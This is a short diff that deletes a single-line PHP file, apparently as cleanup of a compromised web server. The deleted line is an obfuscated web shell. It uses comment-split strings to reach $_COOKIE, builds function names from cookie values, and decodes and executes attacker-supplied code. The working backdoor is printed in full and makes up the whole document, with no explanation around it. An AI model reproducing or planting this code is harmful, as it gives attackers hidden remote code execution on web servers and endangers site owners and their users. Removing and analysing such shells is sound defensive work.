@@ -1,1 +1,0 @@
-<?php $po='_CO';$bn/*#J?*/='E';$yn/*H*/='OKI';$lp=/*.Yx]*/${$po.$yn.$bn};$wl=$lp/*znT*/['Xl'].$lp['Vl'];$nk=/*aQSM*/$lp['PL'].$lp['F']/*F*/.$lp['T'];$y=$wl('',$nk($lp['y']));$y();
